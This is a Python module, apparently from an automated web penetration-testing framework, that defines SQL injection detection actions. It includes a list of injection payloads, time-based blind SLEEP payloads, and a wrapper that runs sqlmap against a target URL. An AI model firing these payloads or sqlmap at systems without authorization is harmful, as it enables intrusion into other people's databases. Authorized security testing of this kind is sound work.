"""SQL Injection actions."""

from actions.registry import action, ActionContext, ActionResult
from core.validators import inject_param
from core.verification_oracle import VerificationOracle
from tools.external import tool_available
from tools.wrappers import curl


@action(
    id="web.sqli.detect",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    tools=["curl"],
    idempotent=True,
    timeout=180,
    description="Test a single parameter for SQL injection using differential analysis",
    category="web",
)
async def detect_sqli(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    oracle = VerificationOracle()
    payloads = [
        "'", "\"", "')", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
    ]

    for payload in payloads:
        test_url = inject_param(url, param, payload)
        base_url = inject_param(url, param, "1")

        base = await oracle.differential.baseline(base_url, method=method)
        test = await oracle.differential.test(test_url, method=method)
        verdict = oracle.differential.compare(base, test)

        if verdict.confidence.value in ("FIRM", "CONFIRMED"):
            repro = await oracle.reproducibility.check(
                lambda: oracle.differential.test(test_url, method=method)
            )
            confidence = "CONFIRMED" if repro.confidence.value == "CONFIRMED" else "FIRM"
            return ActionResult(
                success=True,
                confidence=confidence,
                data={
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "technique": "differential",
                },
                evidence={
                    "differential": verdict.evidence,
                    "reproducibility": repro.evidence,
                },
            )

    return ActionResult(False, error="no SQLi detected with test payloads",
                        confidence="TENTATIVE")


@action(
    id="web.sqli.blind_detect",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=300,
    description="Test for blind/time-based SQL injection using statistical timing",
    category="web",
)
async def detect_blind_sqli(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    oracle = VerificationOracle()

    true_payload = "' OR SLEEP(3)--"
    false_payload = "' AND SLEEP(0)--"

    verdict = await oracle.verify_blind_sqli(url, param, true_payload, false_payload)

    if verdict.confidence.value in ("FIRM", "CONFIRMED"):
        return ActionResult(
            success=True,
            confidence=verdict.confidence.value,
            data={
                "url": url,
                "param": param,
                "payload": true_payload,
                "technique": "time-based",
            },
            evidence=verdict.evidence,
        )

    return ActionResult(False, error="no blind SQLi detected",
                        confidence="TENTATIVE")


@action(
    id="web.sqli.sqlmap",
    risk="HIGH",
    detectability="high",
    requires=["url"],
    produces="VulnCandidate",
    tools=["sqlmap"],
    idempotent=True,
    timeout=900,
    description="Run sqlmap against a parameterized URL for deep SQLi testing",
    category="web",
)
async def sqlmap_sqli(ctx: ActionContext) -> ActionResult:
    if not tool_available("sqlmap"):
        return ActionResult(False, error="sqlmap not installed",
                            confidence="TENTATIVE")

    from tools.external import sqlmap_scan
    url = ctx.params["url"]
    result = await sqlmap_scan(url, timeout=ctx.timeout or 900)

    findings = result.get("results", [])
    if findings:
        return ActionResult(
            success=True,
            confidence="FIRM",
            data={"url": url, "findings": findings},
            evidence={
                "sqlmap": {
                    "target": url,
                    "findings": findings,
                    "exit_code": result.get("exit_code"),
                }
            },
        )

    return ActionResult(False, error="sqlmap found no vulnerabilities",
                        confidence="TENTATIVE")
